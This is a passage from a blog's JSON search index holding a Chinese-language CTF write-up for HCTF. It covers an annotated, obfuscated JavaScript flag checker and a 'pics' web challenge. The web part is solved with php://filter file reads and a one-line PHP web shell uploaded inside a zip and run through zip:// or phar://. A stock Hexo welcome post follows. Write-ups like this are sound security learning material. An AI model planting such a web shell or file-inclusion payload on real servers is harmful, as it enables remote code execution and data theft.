0xeb896b ]; console.log($) var a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z; function check() &#123; //var answer = document.getElementById(\"message\").value; var answer = \"hctf&#123;wh3r3_iz_y0ur_neee3eeed??&#125;\"; var correct = (function() &#123; try &#123; h = new MersenneTwister(parseInt(btoa(answer[_[$[6]]](0, 4)), 32)); e = h[_[$[\"\"+ +[]]]]()*(\"\"+&#123;&#125;)[_[0x4728122]](0xc); for(var _1=0; _1&lt;h.mti; _1++) &#123; e ^= h.mt[_1]; &#125; l = new MersenneTwister(e), v = true; l.random(); l.random(); l.random(); o = answer.split(\"_\"); i = l.mt[~~(h.random()*$[0x1f])%0xff]; // 在这里曾经耽误了很长时间，一直以为i应该是正数，因为如果i是负数，下边的s[0]就会是 \"0x-xxxxxxx\"这种形式的，而我自己在做异或的时候，将s[0]的值取出来做，所以会出现0x(－个负数)与另外一个数做异或。报错。其实这里的s[0]的类型是一个string.所以正负不会影响。 s = [\"0x\" + i[_[$[$.length/2]]](0x10), \"0x\" + e[_[$[$.length/2]]](0o20).split(\"-\")[1]]; //console.log(typeof(s[0])) // console.log((this[_[$[42]]](_[$[31]](o[1])) ^ s[0])) e =- (this[_[$[42]]](_[$[31]](o[1])) ^ s[0]); if (-e != $[21]) return false; // console.log(\"$[22]:\" + $[22]) // console.log(e ^ -$[22] ^ s[1]) //console.log(\"chars:\" + typeof(this[_[$[42]]](_[$[31]](o[2])))) e ^= (this[_[$[42]]](_[$[31]](o[2])) ^ s[1]); console.log(-e);if (-e != $[22]) return false; e -= 0x352c4a9b; //到这里就可以将 o[1],o[2]两个值算出来。 t = new MersenneTwister(Math.sqrt(-e)); h.random(); a = l.random(); t.random(); y = [ 0xb3f970, 0x4b9257a, 0x46e990e ].map(function(i) &#123; return $[_[$[40]]](i)+ +1+ -1- +1; &#125;); o[0] = o[0].substring(5); o[3] = o[3].substring(0, o[3].length - 1); // 把'hctf&#123;' 与 '&#125;' 过滤 u = ~~~~~~~~~~~~~~~~(a * i); console.log(\"a:\"+a); console.log(\"i:\"+i); if (o[0].length &gt; 5) return false; a = parseInt(_[$[23]](\"1\", Math.max(o[0].length, o[3].length)), 3) ^ eval(_[$[31]](o[0])); // 8位 // 以3进制转换 o&#123;0&#125;,o&#123;1&#125;中最长的与 o&#123;1&#125;做异或 r = (h.random() * l.random() * t.random()) / (h.random() * l.random() * t.random()); e ^= ~r; r = (h.random() / l.random() / t.random()) / (h.random() * l.random() * t.random()); e ^= ~~r; a += _[$[31]](o[3].substring(o[3].length - 2)).split(\"x\")[1]; // 取 0xafaf 0x后边的数 if (parseInt(a.split(\"84\")[1], $.length/2) != 0x4439feb) return false; d = parseInt(a, 16) == (Math.pow(2, 16)+ -5+ \"\") + o[3].charCodeAt(o[3].length - 3).toString(16) + \"53846\" + (new Date().getFullYear() - 1 + \"\"); //这里不是65, 而可能是任何一个十六进制在[0-9]之间的字符。所以可以考虑的范围是并不是所有26个字符 // d=parserInt(a,16) == \"65531\" + 65 + 53846 + \"2015\" // 这parseint(a, 16) == 6553165538462015 i = 0xffff; n = (p = (f = _[$[23]](o[3].charAt(o[3].length - 4), 3)) == o[3].substring(1, 4)); g = 3; t = _[$[23]](o[3].charAt(3), 3) == o[3].substring(5, 8) &amp;&amp; o[3].charCodeAt(1) * o[0].charCodeAt(0) == 0x2ef3; // o[3]的第四位重复3遍与 o[3]的 5,6,7 相等， 分别是 e, w h = ((31249*g) &amp; i).toString(16); // h的值是6e33 i = _[$[31]](o[3].split(f).join(\"\").substring(0, 2)).split(\"x\")[1]; s = i == h; return (p &amp; t &amp; s &amp; d) === 1 || (p &amp; t &amp; s &amp; d) === true; &#125; catch (e) &#123; console.log(\"gg\"); return false; &#125; &#125;)(); //document.getElementById(\"message\").placeholder = correct ? \"correct\" : \"wrong\"; if (correct) &#123; alert(\"Congratulations! you got it!\"); &#125; else &#123; alert(\"Sorry, you are wrong...\"); &#125; &#125;;check(); 兵者多诡这题并不难，考点的是php的伪协议。 首先是php://filter 通过http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=upload/function等可以读出upload.php 与 function.php 。 但是在请求flag.txt时有问题了，经检查是因为../ 字符被检查到了之后，就是返回 no no no . upload.php可以看出，除了size/type之外并没有检查其他的。所以可以上传任意类型的文件，只要修改请求头即可。 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpinclude 'function.php';if(isset($_POST['submit']) &amp;&amp; !empty($_FILES['image']['tmp_name']))&#123;$name = $_FILES['image']['tmp_name'];$type = $_FILES['image']['type'];$size = $_FILES['image']['size'];if(!is_uploaded_file($name))&#123; ?&gt; &lt;div class=\"alert alert-danger\" role=\"alert\"&gt;图片上传失败,请重新上传&lt;/div&gt; &lt;?php exit;&#125;if($type !== 'image/png')&#123; ?&gt; &lt;div class=\"alert alert-danger\" role=\"alert\"&gt;只能上传PNG图片&lt;/div&gt; &lt;?php exit;&#125;if($size &gt; 10240)&#123; ?&gt; &lt;div class=\"alert alert-danger\" role=\"alert\"&gt;图片大小超过10KB&lt;/div&gt; &lt;?php exit;&#125;$imagekey = create_imagekey();move_uploaded_file($name,\"uploads/$imagekey.png\");echo \"&lt;script&gt;location.href='?fp=show&amp;imagekey=$imagekey'&lt;/script&gt;\";&#125;?&gt; 第二个协议是 phar:// 与zip:// 两个伪协议都是用来处理zip压缩文件的。 如用zip的话，可以这样写。 创建一个php文件，内容为: &lt;?php $_GET[&#39;param1&#39;]($_GET[&#39;param2&#39;]); ?&gt; zip shell.zip shell.php 将php文件压缩。 上传之后拿到生成的文件名，请求如下。可以得到路径。 如果用phar:// 协议，可以php的文件如下 :&lt;?php print_r( scandir(&#39;/var/www/&#39;)) ?&gt; 并压缩为zip文件。 上传之后用phar://请求： 最后http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=/var/www/Th1s_1s_F1a9 来得到flag #","tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"Hello World","date":"2017-01-16T03:40:14.000Z","path":"2017/01/16/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]